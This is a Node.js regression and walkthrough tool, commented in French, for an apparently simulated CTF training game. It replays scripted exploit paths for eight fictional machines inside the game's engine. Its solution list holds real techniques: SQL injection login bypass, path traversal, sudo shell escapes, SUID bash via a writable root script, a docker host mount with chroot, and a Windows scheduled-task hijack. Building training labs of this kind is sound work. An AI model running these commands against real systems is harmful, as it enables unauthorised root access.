#!/usr/bin/env node
// tools/solve.js — Solveur automatique local (dev only, JAMAIS embarqué dans le jeu).
//
// Rejoue la "solution officielle" de chaque machine dans le vrai moteur (chargé en
// contexte vm isolé, comme tests/run.js) et vérifie qu'aucune régression ne casse un
// chemin d'exploit : les 5 jalons de progression (recon, access, privesc, userFlag,
// rootFlag) doivent tous passer, et le flag root récupéré doit correspondre à
// machine.rootFile.content.
//
// À la différence de tests/run.js (qui teste aussi parsing/pipes/Jeopardy/insane...),
// ce script est un *smoke test des chemins d'exploit* et un générateur de walkthrough.
//
// Usage :
//   node tools/solve.js                 # rejoue les 8 machines, résumé compact
//   node tools/solve.js --verbose       # affiche chaque commande + sortie du moteur
//   node tools/solve.js --machine nimbus  # une seule machine (implique --verbose)
//   node tools/solve.js --walkthrough   # imprime un pas-à-pas propre (sans détails moteur)
//
// Code de sortie : 0 si toutes les machines demandées passent, 1 sinon.

const fs = require("fs");
const path = require("path");
const vm = require("vm");

const args = process.argv.slice(2);
const only = args.includes("--machine") ? args[args.indexOf("--machine") + 1] : null;
const verbose = args.includes("--verbose") || !!only;
const walkthrough = args.includes("--walkthrough");

// ── Chargement du moteur dans un contexte isolé (identique à tests/run.js) ────
function freshContext() {
  const store = {};
  const localStorage = {
    getItem: (k) => (k in store ? store[k] : null),
    setItem: (k, v) => { store[k] = String(v); },
    removeItem: (k) => { delete store[k]; },
  };
  const context = { localStorage, toast: () => {}, console };
  vm.createContext(context);
  const code =
    fs.readFileSync(path.join(__dirname, "../js/machines.js"), "utf8") + "\n" +
    fs.readFileSync(path.join(__dirname, "../js/engine.js"), "utf8");
  vm.runInContext(code, context, { filename: "engine-under-test.js" });
  vm.runInContext("resetSessionToAttacker();", context);
  return context;
}
const run = (ctx, cmd) => vm.runInContext(`runCommand(${JSON.stringify(cmd)})`, ctx);
const pass = (ctx, pwd) => vm.runInContext(`tryPassword(${JSON.stringify(pwd)})`, ctx);
const get = (ctx, expr) => vm.runInContext(expr, ctx);

// ── Solutions officielles ─────────────────────────────────────────────────────
// Le mot de passe et le flag attendu ne sont pas dupliqués : on les lit depuis la
// machine. Seule la séquence de commandes (le "chemin") est décrite ici. Chaque
// étape est soit une string (commande), soit { pw: true } pour saisir le mot de
// passe SSH de la machine.
const SOLUTIONS = {
  nimbus: [
    "nmap 10.10.11.21", "curl http://10.10.11.21/", "ftp 10.10.11.21",
    "cat ~/loot/nimbus-ftp/backup_users.txt", "ssh jsmith@10.10.11.21", { pw: true },
    "cat user.txt", "sudo -l", "sudo /usr/bin/less /var/log/nginx/access.log", "!sh",
    "cat /root/root.txt",
  ],
  vortex: [
    "nmap 10.10.11.15", "curl http://10.10.11.15/", "curl http://10.10.11.15/api/docs",
    "curl http://10.10.11.15/api/users/1", "curl http://10.10.11.15/api/users/2",
    "ssh kwright@10.10.11.15", { pw: true }, "cat user.txt", "sudo -l", "sudo man man", "!sh",
    "cat /root/root.txt",
  ],
  cerberus: [
    "nmap 10.10.11.42", "curl http://10.10.11.42/robots.txt", "curl http://10.10.11.42/.env",
    "ssh mdurand@10.10.11.42 -p 2222", { pw: true }, "cat user.txt", "sudo -l",
    "echo 'chmod +s /bin/bash' >> /opt/scripts/backup.sh", "whoami", "bash -p",
    "cat /root/root.txt",
  ],
  obsidian: [
    "nmap 10.10.11.77", "curl http://10.10.11.77:8000/", "curl http://10.10.11.77:8000/old/site-backup.txt",
    "ssh tvasquez@10.10.11.77", { pw: true }, "cat user.txt", "sudo -l",
    "find / -perm -4000 -type f 2>/dev/null", "find . -exec /bin/sh -p \\; -quit",
    "cat /root/root.txt",
  ],
  phantom: [
    "nmap 10.10.11.58", "curl http://10.10.11.58/",
    'curl "http://10.10.11.58/index.php?page=../../../../var/www/html/config.php.bak"',
    'curl -d "user=broland&pass=\' OR \'1\'=\'1\' -- -" http://10.10.11.58/admin/login.php',
    "ssh broland@10.10.11.58", { pw: true }, "cat user.txt", "sudo -l",
    "sudo awk 'BEGIN {system(\"/bin/sh\")}'", "cat /root/root.txt",
  ],
  meridian: [
    "nmap 10.10.11.101", "curl http://10.10.11.101:8080/",
    'curl "http://10.10.11.101:8080/report?file=../../../../etc/meridian/config.bak"',
    "ssh npatel@10.10.11.101", { pw: true }, "cat user.txt", "sudo -l",
    "sudo python3 -c 'import os; os.system(\"/bin/sh\")'", "cat /root/root.txt",
  ],
  glacier: [
    "nmap 10.10.11.230", "ftp 10.10.11.230", "cat ~/loot/glacier-ftp/svc_notes.txt",
    "ssh svc_backup@10.10.11.230", { pw: true }, "type user.txt", "schtasks /query",
    "icacls C:\\Scripts\\backup.bat",
    "echo copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\Temp\\svc.exe >> C:\\Scripts\\backup.bat",
    "whoami", "C:\\Windows\\Temp\\svc.exe", "type root.txt",
  ],
  axiom: [
    "nmap 10.10.11.244", "curl http://10.10.11.244:8080/", "curl http://10.10.11.244:8080/logs/latest.txt",
    "ssh cibuild@10.10.11.244", { pw: true }, "cat user.txt", "sudo -l", "id", "docker ps",
    "docker run -v /:/mnt --rm -it alpine chroot /mnt sh", "cat /root/root.txt",
  ],
};

// Le mot de passe SSH d'une machine = l'unique entrée de sshUsers (celui du chemin officiel).
function sshPassword(machine) {
  const users = Object.values(machine.sshUsers || {});
  const withPw = users.find((u) => u.password);
  return withPw ? withPw.password : null;
}

const C = { red: "\x1b[31m", green: "\x1b[32m", gray: "\x1b[90m", cyan: "\x1b[36m", bold: "\x1b[1m", reset: "\x1b[0m" };

function solveMachine(id) {
  const ctx = freshContext();
  vm.runInContext("GAME.unlocked = MACHINES.map(m => m.id);", ctx);
  const machine = get(ctx, `MACHINES.find(m => m.id === ${JSON.stringify(id)})`);
  if (!machine) return { id, ok: false, reason: "machine inconnue" };
  const steps = SOLUTIONS[id];
  if (!steps) return { id, ok: false, reason: "aucune solution officielle définie" };

  run(ctx, `use ${id}`);
  if (verbose || walkthrough) console.log(`\n${C.bold}${C.cyan}▶ ${machine.name}${C.reset} ${C.gray}(${machine.difficulty} — ${machine.os})${C.reset}`);

  let last = null;
  for (const step of steps) {
    if (typeof step === "object" && step.pw) {
      const pw = sshPassword(machine);
      last = pass(ctx, pw);
      if (verbose) console.log(`  ${C.gray}[mot de passe SSH] ${pw}${C.reset}`);
      else if (walkthrough) console.log(`  ${C.gray}→ (mot de passe : ${pw})${C.reset}`);
      continue;
    }
    last = run(ctx, step);
    if (walkthrough) console.log(`  ${C.cyan}$ ${step}${C.reset}`);
    else if (verbose) {
      const preview = (last && last.text ? last.text : "").split("\n")[0].slice(0, 100);
      const mark = last && last.cls === "t-err" ? `${C.red}✗${C.reset}` : `${C.green}✓${C.reset}`;
      console.log(`  ${mark} ${C.cyan}$ ${step}${C.reset}  ${C.gray}${preview}${C.reset}`);
    }
  }

  const p = get(ctx, `GAME.progress.${id}`);
  const milestones = ["recon", "access", "privesc", "userFlag", "rootFlag"];
  const missing = milestones.filter((k) => !p[k]);
  const rootExpected = machine.rootFile.content;
  const rootOk = last && typeof last.text === "string" && last.text.includes(rootExpected);
  const ok = missing.length === 0 && rootOk && last && last.cls !== "t-err";

  return {
    id, name: machine.name, ok,
    missing,
    rootOk,
    reason: ok ? null : (missing.length ? `jalons manquants : ${missing.join(", ")}` : (!rootOk ? "flag root non récupéré" : "dernière étape en erreur")),
  };
}

// ── Exécution ────────────────────────────────────────────────────────────────
const ids = only ? [only] : Object.keys(SOLUTIONS);
console.log(`${C.bold}Solveur automatique — CTF Lab${C.reset} ${C.gray}(${ids.length} machine(s))${C.reset}`);

const results = ids.map(solveMachine);
console.log(`\n${"─".repeat(60)}`);
let failed = 0;
for (const r of results) {
  const label = (r.name || r.id).padEnd(12);
  if (r.ok) {
    console.log(`  ${C.green}✓${C.reset} ${label} ${C.gray}recon+access+privesc+2 flags OK${C.reset}`);
  } else {
    failed++;
    console.log(`  ${C.red}✗ ${label} ${r.reason}${C.reset}`);
  }
}
console.log(`${"─".repeat(60)}`);
if (failed === 0) {
  console.log(`${C.green}✅ ${results.length}/${results.length} machine(s) résolues — aucun chemin d'exploit cassé.${C.reset}`);
  process.exit(0);
} else {
  console.log(`${C.red}❌ ${failed}/${results.length} machine(s) en échec — une régression casse un chemin d'exploit.${C.reset}`);
  process.exit(1);
}
